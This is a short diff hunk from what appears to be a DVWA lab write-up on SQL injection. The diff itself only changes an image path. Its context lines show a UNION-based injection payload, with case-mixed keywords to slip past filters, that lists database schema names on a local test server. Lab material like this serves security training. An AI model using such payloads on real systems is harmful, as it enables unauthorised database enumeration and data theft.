@@ -8,7 +8,7 @@ http://127.0.0.1:42001/vulnerabilities/sqli/?id=0%27union%20select%201,gRoUp_cOn
 union select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
 ```
 
-![../images/DVWA_LOW_DB_NAME.png](../images/DVWA_LOW_DB_NAME.png)
+![DVWA_LOW_DB_NAME.png](SQL_Injection/Images/DVWA_LOW_COLUMNNAME.png)
 
 ### Extract tables from database
 
